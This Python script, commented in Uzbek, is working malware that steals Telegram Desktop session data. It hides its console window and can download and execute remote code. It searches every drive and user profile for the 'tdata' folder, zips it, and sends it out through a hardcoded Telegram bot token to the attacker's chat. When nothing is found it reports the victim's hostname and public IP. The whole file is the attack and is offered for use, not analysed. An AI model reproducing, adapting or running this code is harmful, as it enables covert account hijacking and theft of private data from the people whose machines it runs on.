import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json

# O'z-o'zini ishga tushirish
if len(sys.argv) > 0 and "http" in sys.argv[0]:
    try:
        exec(urllib.request.urlopen(sys.argv[0]).read())
        sys.exit()
    except:
        pass

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_telegram_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

def zip_and_send(tdata_path):
    pc_name = socket.gethostname()
    try:
        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                    except: pass
        send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
        os.remove(zip_path)
        return True
    except:
        return False

# ============================================================
# SUPER QIDIRUVCHI (Barcha disklar va foydalanuvchilar)
# ============================================================
def find_tdata_anywhere():
    # C: dan Z: gacha barcha mantiqiy disklarni tekshiramiz
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\"
        if os.path.exists(drive):
            users_dir = os.path.join(drive, "Users")
            if os.path.exists(users_dir):
                try:
                    for user_folder in os.listdir(users_dir):
                        user_path = os.path.join(users_dir, user_folder)
                        if os.path.isdir(user_path):
                            # 4 ta asosiy variantni tekshiramiz
                            possible_paths = [
                                os.path.join(user_path, "AppData", "Roaming", "Telegram Desktop", "tdata"),
                                os.path.join(user_path, "AppData", "Local", "Telegram Desktop", "tdata"),
                                os.path.join(user_path, "AppData", "Roaming", "TelegramDesktop", "tdata"),
                                os.path.join(user_path, "AppData", "Local", "TelegramDesktop", "tdata")
                            ]
                            for path in possible_paths:
                                if os.path.exists(path):
                                    return path
                except:
                    pass
    return None

# ============================================================
# ASOSIY ISHCHI
# ============================================================
def main():
    pc_name = socket.gethostname()
    
    # 1. Hamma joydan qidiramiz
    tdata_path = find_tdata_anywhere()
    
    if tdata_path:
        send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({tdata_path})")
        if zip_and_send(tdata_path):
            send_telegram_message(f"✅ {pc_name}: tdata muvaffaqiyatli yuborildi!")
    else:
        try:
            ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
            send_telegram_message(f"⚠️ {pc_name}: tdata topilmadi! (Hamma joy qidirildi)\nIP: {ip}")
        except:
            pass

if __name__ == "__main__":
    main()
